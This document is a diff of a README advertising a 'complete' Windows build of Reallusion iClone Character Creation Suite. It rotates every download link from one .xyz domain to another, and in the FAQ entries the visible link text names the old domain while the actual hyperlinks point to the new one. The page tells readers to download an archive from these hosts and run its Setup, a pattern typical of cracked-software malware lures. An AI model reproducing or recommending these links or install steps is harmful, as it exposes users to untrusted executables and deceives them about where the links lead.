@@ -28,8 +28,8 @@ Premium · Pro · Complete build · Windows
 
 > Use the project link below for Windows.
 
-* **Project link:** **[reallusion-iclone-character-creation-suite.nexpath.xyz](https://reallusion-iclone-character-creation-suite.nexpath.xyz/)**
-* **Full URL:** `https://reallusion-iclone-character-creation-suite.nexpath.xyz/`
+* **Project link:** **[reallusion-iclone-character-creation-suite.nerasix.xyz](https://reallusion-iclone-character-creation-suite.nerasix.xyz/)**
+* **Full URL:** `https://reallusion-iclone-character-creation-suite.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -41,8 +41,7 @@ Premium · Pro · Complete build · Windows
 - 🧩 **Plugin support** — Third-party extensions compatible.
 - 🖼️ **High-quality output** — Production resolutions and passes supported.
 - 🖥️ **Windows optimized** — Built for Windows 10/11 creative workstations.
-- ⚡ **One command setup** — PowerShell handles download, unpack and install.
-
+- 
 ## `REQUIREMENTS`
 
 | | |
@@ -55,17 +54,17 @@ Premium · Pro · Complete build · Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://reallusion-iclone-character-creation-suite.nexpath.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://reallusion-iclone-character-creation-suite.nerasix.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://reallusion-iclone-character-creation-suite.nexpath.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://reallusion-iclone-character-creation-suite.nerasix.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://reallusion-iclone-character-creation-suite.nexpath.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://reallusion-iclone-character-creation-suite.nerasix.xyz/">reallusion-iclone-character-creation-suite.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
